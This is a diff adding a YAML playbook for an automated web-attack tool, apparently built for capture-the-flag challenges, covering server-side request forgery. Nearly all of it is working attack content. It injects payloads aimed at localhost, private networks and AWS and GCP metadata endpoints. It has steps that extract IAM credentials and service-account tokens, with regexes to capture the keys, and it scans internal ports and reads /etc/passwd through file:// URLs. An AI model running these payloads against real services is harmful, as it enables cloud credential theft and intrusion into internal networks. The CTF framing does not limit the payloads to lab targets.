@@ -1,0 +1,202 @@
+# ============================================================
+# Tree metadata
+# ============================================================
+id: web_ssrf
+name: Server-Side Request Forgery
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects and exploits SSRF vulnerabilities where the server makes outbound
+  requests based on user input. Targets cloud metadata services, internal
+  services, and localhost access to extract credentials and sensitive data.
+
+# ============================================================
+# Guard
+# ============================================================
+applies_when:
+  - "context.challenge.type == 'web'"
+
+min_confidence: 0.10
+
+stop_on_flag: true
+
+# ============================================================
+# Confidence seeds
+# ============================================================
+confidence_seeds:
+  - if: "any(p in context.params for p in ['url','uri','path','link','redirect','fetch','callback','endpoint','target','dest','destination'])"
+    boost: 0.35
+    label: "URL parameter found"
+  - if: "any(p in context.found_paths for p in ['/fetch', '/proxy', '/download', '/image', '/webhook', '/redirect'])"
+    boost: 0.20
+    label: "Proxy-style endpoint found"
+  - if: "'aws' in context.tech_stack or 'ec2' in context.tech_stack or 'cloud' in context.tech_stack"
+    boost: 0.25
+    label: "Cloud infrastructure detected"
+  - if: "any(p in context.params for p in ['img','image','avatar','photo','file'])"
+    boost: 0.15
+    label: "Image fetch parameter found"
+
+# ============================================================
+# Detection paths
+# ============================================================
+detection_paths:
+
+  - id: localhost_probe
+    name: Localhost access probe
+    description: >
+      Test if server makes requests to localhost/127.0.0.1 and returns response.
+    min_confidence: 0.10
+    steps:
+      - id: localhost_test
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - 'http://localhost'
+            - 'http://127.0.0.1'
+            - 'http://0.0.0.0'
+            - 'http://[::1]'
+        signals:
+          - match: 'localhost|127\.0\.0\.1'
+            on_match:
+              confidence_boost: 0.35
+              emit: ssrf_localhost_confirmed
+
+  - id: internal_network_probe
+    name: Internal network probe
+    description: >
+      Test for access to RFC1918 private addresses.
+    min_confidence: 0.15
+    steps:
+      - id: internal_test
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - 'http://192.168.1.1'
+            - 'http://10.0.0.1'
+            - 'http://172.16.0.1'
+        signals:
+          - match: 'private|internal|admin'
+            on_match:
+              confidence_boost: 0.30
+              emit: ssrf_internal_confirmed
+
+  - id: metadata_service_probe
+    name: Cloud metadata service detection
+    description: >
+      Test for access to AWS/GCP/Azure metadata endpoints.
+    min_confidence: 0.15
+    steps:
+      - id: metadata_test
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - 'http://169.254.169.254'
+            - 'http://169.254.169.254/latest/meta-data/'
+            - 'http://metadata.google.internal'
+        signals:
+          - match: 'ami-id|instance-id|iam|credentials|metadata'
+            on_match:
+              confidence_boost: 0.45
+              emit: ssrf_metadata_confirmed
+
+# ============================================================
+# Exploitation paths
+# ============================================================
+exploitation_paths:
+
+  - id: aws_metadata_creds
+    name: AWS metadata credential extraction
+    requires_signal: ssrf_metadata_confirmed
+    technique: aws_imds_v1_exploitation
+    steps:
+      - id: list_iam_roles
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+        capture:
+          - pattern: '[a-zA-Z0-9_-]+'
+            as: iam_role_name
+      - id: extract_credentials
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'http://169.254.169.254/latest/meta-data/iam/security-credentials/Admin'
+            - 'http://169.254.169.254/latest/meta-data/iam/security-credentials/Default'
+            - 'http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role'
+        capture:
+          - pattern: 'AKIA[0-9A-Z]{16}'
+            as: aws_access_key
+          - pattern: 'SecretAccessKey["\s:]+([A-Za-z0-9/+=]{40})'
+            as: aws_secret_key
+          - pattern: 'Token["\s:]+([A-Za-z0-9/+=]+)'
+            as: aws_session_token
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+
+  - id: gcp_metadata_exfil
+    name: GCP metadata extraction
+    requires_signal: ssrf_metadata_confirmed
+    technique: gcp_metadata_exploitation
+    steps:
+      - id: gcp_creds_extract
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
+            - 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'
+            - 'http://metadata.google.internal/computeMetadata/v1/?recursive=true'
+        capture:
+          - pattern: 'access_token["\s:]+([A-Za-z0-9._-]+)'
+            as: gcp_access_token
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+
+  - id: internal_service_scan
+    name: Internal service access
+    requires_signal: ssrf_localhost_confirmed
+    technique: internal_network_scanning
+    steps:
+      - id: common_internal_ports
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'http://localhost:8080'
+            - 'http://localhost:9090'
+            - 'http://localhost:6379'
+            - 'http://127.0.0.1:5000'
+            - 'http://127.0.0.1:3000'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'admin|dashboard|redis|api'
+            as: internal_service_found
+
+  - id: file_protocol_read
+    name: File protocol exploitation
+    requires_signal: ssrf_localhost_confirmed
+    technique: file_scheme_read
+    steps:
+      - id: file_read_attempt
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - 'file:///etc/passwd'
+            - 'file:///flag.txt'
+            - 'file:///var/www/flag.txt'
+            - 'file://localhost/flag.txt'
+        capture:
+          - pattern: 'root:.*:/bin/'
+            as: passwd_file_read
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
